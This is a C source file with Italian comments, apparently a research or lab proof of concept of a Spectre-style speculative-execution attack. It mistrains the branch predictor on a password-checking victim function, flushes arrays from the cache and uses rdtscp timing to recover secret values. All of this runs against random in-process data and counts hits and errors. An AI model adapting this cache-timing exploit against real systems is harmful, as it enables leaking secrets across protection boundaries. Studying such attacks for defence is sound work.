/*
 * password.c
 *
 *  Created on: 17 lug 2018
 *      Author: Marco
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <math.h>
#include <limits.h>
#include <unistd.h>

#ifdef _MSC_VER
#include <intrin.h> // per usare rdtscp e clflush
#pragma optimize("gt",on)
#else
#include <x86intrin.h> // per usare rdtscp e clflush
#endif

/********************************************************************
 Codice vittima
 ********************************************************************/
#define SIZE 3000
#define PI 3.1415926536

uint8_t unused1[64];
unsigned int secret[SIZE];
uint8_t unused2[64];
unsigned int array1[SIZE];
uint8_t unused3[64];
unsigned int passwordDigest[SIZE];

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(int userID, int pwd) {
	if (pwd == passwordDigest[userID]) {
		temp &= array1[secret[userID]];
	}
}

/**********************************************************************
 * Random Noise
 *********************************************************************/
//double AWGN_generator() {
//
////Generates additive white Gaussian Noise samples with zero mean and a standard deviation of 1
//
//	double temp1;
//	double temp2;
//	double result;
//	int p;
//
//	p = 1;
//
//	while (p > 0) {
//		temp2 = (rand() / ((double) RAND_MAX)); /*  rand() function generates an
//		 integer between 0 and  RAND_MAX,
//		 which is defined in stdlib.h.
//		 */
//
//		if (temp2 == 0) { // temp2 is >= (RAND_MAX / 2)
//			p = 1;
//		} // end if
//		else { // temp2 is < (RAND_MAX / 2)
//			p = -1;
//		} // end else
//
//	} // end while()
//
//	temp1 = cos((2.0 * (double) PI) * rand() / ((double) RAND_MAX));
//	result = sqrt(-2.0 * log(temp2)) * temp1;
//
//	return result > 0 ? result : -1 * result;	// return the generated random sample to the caller
//
//}	// end AWGN_generator()
/**********************************************************************
 Main
 *********************************************************************/

int main(int argn, char *argv[]) {

#define CACHELINE 512

	// verifica se gli argomenti sono in numero giusto
	// 1 - number of runs
	// 2 - number of tests

	if (argn - 1 != 2) {
		printf("Numero inesatto di argomenti\n");
		exit(1);
	}

	int numberOfTest = strtol(argv[2], NULL, 10); // numero di test
	int numberOfRuns = strtol(argv[1], NULL, 10); // numero di run per ogni test

	int userUnderAttack;

	int blocks = sizeof(array1[0]) * 8; // numero di bit occupati da ogni posizione dell'array
	int delta = CACHELINE / blocks; // ampiezza intervallo dati contenuti in una cache line
	int class = (SIZE / delta) + 1; // classi di risultati

	int results[class]; // array risultati

	int ok = 0; // contatore di OK
	int error = 0; // contatore di ERROR
	int min = -1;
	int index = -1;

	unsigned int timeReg;
	register uint64_t time1, time2;

	// inizializzo il seme del random per avere risultati diversi ad ogni test
	srand(time(NULL));

	for (int t = 1; t <= numberOfTest; t++) {

		printf("Test %d di %d\n", t, numberOfTest);

		// scelgo casualmente l'user da attaccare
		userUnderAttack = rand() % SIZE;

		// inizializzo casualmente gli array
		for (int i = 0; i < SIZE; i++) {
			passwordDigest[i] = rand() % SIZE;
			array1[i] = rand() % SIZE;
			secret[i] = rand() % SIZE;
		}

		// inizializzo a 0 l'array risultati
		for (int i = 0; i < class; i++) {
			results[i] = INT_MAX - 1;
		}

		// per ogni run
		for (int j = 0; j < numberOfRuns; j++) {

			for (int l = 0; l < SIZE; l += delta) {

				//addestro il branch predictor
				for (int i = 1; i < 10; i++) {
					victim_function(1, passwordDigest[1]);
				}

				// flushing array1 e passwordDigest dalla cache
				for (int i = 0; i < SIZE; i++) {
					_mm_clflush(&array1[i]);
					_mm_clflush(&passwordDigest[i]);
				}

				for (volatile int z = 0; z < 100; z++) {
				} /* Delay (can also mfence) */

				// richiamo la funzione vittima con l'ID da attaccare
				victim_function(userUnderAttack, 1);

				// calcolo il tempo di accesso alla posizione l

				for (volatile int z = 0; z < 100; z++) {
				} /* Delay (can also mfence) */

				time1 = __rdtscp(&timeReg);
				timeReg = array1[l];
				time2 = __rdtscp(&timeReg) - time1;

				for (volatile int z = 0; z < 100; z++) {
				} /* Delay (can also mfence) */

				long int avg = (((j) * results[l / delta]) + (int) time2)
						/ (j + 1);

//				printf("%d -> %d\n", l / delta, (int) time2);

				results[l / delta] = (int) avg;
			}
		}

		// cerco il minimo nell'array dei risultati
		min = 1000;
		index = -1;
		for (int i = 0; i < class; i++) {
//			printf("%d -> %d\n", i, results[i]);
			if (results[i] < min) {
				min = results[i];
				index = i;
			}
		}

		// stampo il risultato confrontando il candidato
		// con il piu alto numero di occorrenze e lo confronto con il segreto
		// assicurandomi che ci sia almeno una occorrenza
		if (results[index] > 0 && index == secret[userUnderAttack] / delta) {
			printf("OK %d -> %d\n", index, secret[userUnderAttack] / delta);
			ok++;
		} else {
			printf("ERROR %d -> %d\n", index, secret[userUnderAttack] / delta);
			error++;
		}
	}

// stampo il conteggio totale degli errori e degli ok
	printf("***TOTALI***\nOK -> %d\nERROR -> %d\n", ok, error);

	return (0);
}
